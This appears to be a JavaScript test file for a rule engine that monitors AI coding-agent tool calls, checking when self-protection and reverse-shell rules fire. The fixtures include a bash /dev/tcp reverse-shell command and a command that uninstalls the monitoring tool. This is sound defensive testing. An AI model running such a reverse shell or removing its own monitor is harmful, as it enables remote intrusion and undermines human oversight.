import { test } from "node:test";
import assert from "node:assert/strict";
import { RuleEngine, COMMUNITY_RULES, normalizeAction } from "../dist/index.js";
import { extractExecText, extractStagedContent, isWriteTool, evaluatePathMatch } from "../dist/conditions/index.js";
import { extractWriteTargets } from "../dist/conditions/write-targets.js";

let seq = 0;
function event(tool_name, parameters) {
  return {
    schema_version: 1,
    event_id: `evt-antigravity-${++seq}`,
    session_id: "sess-antigravity",
    occurred_at: "2026-10-21T12:00:00.000Z",
    recorded_at: "2026-10-21T12:00:00.000Z",
    interceptor: "antigravity-hook",
    event_type: "tool.invoked",
    tool_call_id: `tc-antigravity-${seq}`,
    tool_name,
    mcp_server: "builtin",
    parameters,
    cwd: "/home/case/repo",
  };
}

const run = (id, ev) => new RuleEngine(COMMUNITY_RULES.filter((r) => r.rule_id === id)).evaluate(ev);
const command = "omnodex uninstall --confirm";
const target = "/home/case/repo/deploy.sh";
const fileTools = [
  ["write_to_file", (text, path = target) => ({ TargetFile: path, CodeContent: text, Overwrite: true })],
  ["replace_file_content", (text, path = target) => ({ TargetFile: path, TargetContent: command, ReplacementContent: text })],
  ["multi_replace_file_content", (text, path = target) => ({ TargetFile: path, ReplacementChunks: [{ TargetContent: command, ReplacementContent: text }] })],
];

for (const name of ["run_command", "mcp__terminal__run_command"]) {
  test(`${name}: MUST_FIRE for executed self-protection and reverse-shell commands`, () => {
    for (const [id, text] of [
      ["RULE_SELF_PROTECTION_BASH", command],
      ["RULE_THREAT_REVERSE_SHELL", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"],
    ]) {
      const ev = event(name, { CommandLine: text, Cwd: "/home/case/repo" });
      assert.equal(extractExecText(ev), text);
      assert.equal(run(id, ev).length, 1);
      assert.equal(normalizeAction(ev).command, text);
    }
  });

  test(`${name}: MUST_NOT_FIRE for routine commands or threat text in descriptions`, () => {
    const ev = event(name, { CommandLine: "pwd", Description: command });
    assert.deepEqual(run("RULE_SELF_PROTECTION_BASH", ev), []);
    assert.deepEqual(run("RULE_THREAT_REVERSE_SHELL", ev), []);
  });
}

test("Antigravity shell actions retain destinations and output paths", () => {
  const ev = event("run_command", { CommandLine: "curl https://collector.example.net/data > /tmp/case.json" });
  const action = normalizeAction(ev);
  assert.equal(action.exec, ev.parameters.CommandLine);
  assert.deepEqual(action.writes, ["/tmp/case.json"]);
  assert.equal(action.destinations[0].host, "collector.example.net");
  assert.ok(action.kinds.has("exec") && action.kinds.has("write") && action.kinds.has("network"));
});

for (const [tool, params] of fileTools) {
  for (const name of [tool, `mcp__filesystem__${tool}`]) {
    test(`${name}: staged writes and normalized targets use native fields`, () => {
      const ev = event(name, params(command));
      assert.equal(isWriteTool(ev), true);
      assert.equal(extractExecText(ev), null);
      assert.deepEqual(extractStagedContent(ev), [{ path: target, text: command }]);
      assert.deepEqual(extractWriteTargets(ev), [target]);
      const action = normalizeAction(ev);
      assert.deepEqual(action.paths, [target]);
      assert.deepEqual(action.writes, [target]);
      assert.deepEqual([...action.kinds], ["write"]);
      assert.equal(evaluatePathMatch({ access: "write", patterns: [{ regex: "deploy\\.sh$", label: "script" }] }, ev).length, 1);
      assert.deepEqual(evaluatePathMatch({ access: "read", patterns: [{ regex: "deploy\\.sh$", label: "script" }] }, ev), []);
    });

    test(`${name}: MUST_FIRE one severity lower for a staged uninstall`, () => {
      const findings = run("RULE_SELF_PROTECTION_BASH", event(name, params(command)));
      assert.equal(findings.length, 1);
      assert.equal(findings[0].severity, "MEDIUM");
      assert.match(findings[0].description, /written to \/home\/case\/repo\/deploy\.sh/);
    });

    test(`${name}: MUST_NOT_FIRE for removed text, instructions, or documentation`, () => {
      const benign = event(name, { ...params("echo ready"), Description: command, Instruction: command });
      assert.deepEqual(run("RULE_SELF_PROTECTION_BASH", benign), []);
      assert.deepEqual(extractStagedContent(benign), [{ path: target, text: "echo ready" }]);
      assert.deepEqual(run("RULE_SELF_PROTECTION_BASH", event(name, params(command, "/home/case/repo/README.md"))), []);
    });

    test(`${name}: URLs in written content are not active destinations`, () => {
      const action = normalizeAction(event(name, params("curl https://collector.example.net")));
      assert.deepEqual(action.destinations, []);
      assert.equal(action.outbound, false);
      assert.equal(action.kinds.has("network"), false);
    });
  }
}

test("Antigravity replacement chunks include only new text and tolerate malformed entries", () => {
  const ev = event("multi_replace_file_content", {
    TargetFile: target,
    ReplacementChunks: [null, 3, {}, { TargetContent: command }, { ReplacementContent: "echo one" }, { ReplacementContent: "echo two" }],
  });
  assert.deepEqual(extractStagedContent(ev), [{ path: target, text: "echo one\necho two" }]);
  assert.deepEqual(run("RULE_SELF_PROTECTION_BASH", ev), []);
});

test("Antigravity nested configuration targets are staged", () => {
  for (const path of ["/home/case/.gemini/config/mcp_config.json", "/home/case/.gemini/antigravity-cli/settings.json", "C:\\Users\\case\\repo\\.agents\\mcp_config.json"]) {
    assert.deepEqual(extractStagedContent(event("write_to_file", { TargetFile: path, CodeContent: "{}" })), [{ path, text: "{}" }]);
  }
});

test("Antigravity file reads and unknown tools cannot become writes or commands", () => {
  const read = event("view_file", { AbsolutePath: target, CommandLine: command });
  assert.deepEqual(normalizeAction(read).paths, [target]);
  assert.deepEqual(normalizeAction(read).writes, []);
  assert.equal(isWriteTool(read), false);
  assert.equal(extractExecText(read), null);
  assert.deepEqual(extractStagedContent(read), []);
  const unknown = event("describe_change", { TargetFile: target, CodeContent: command, CommandLine: command });
  assert.deepEqual(extractWriteTargets(unknown), []);
  assert.deepEqual(extractStagedContent(unknown), []);
  assert.equal(extractExecText(unknown), null);
});
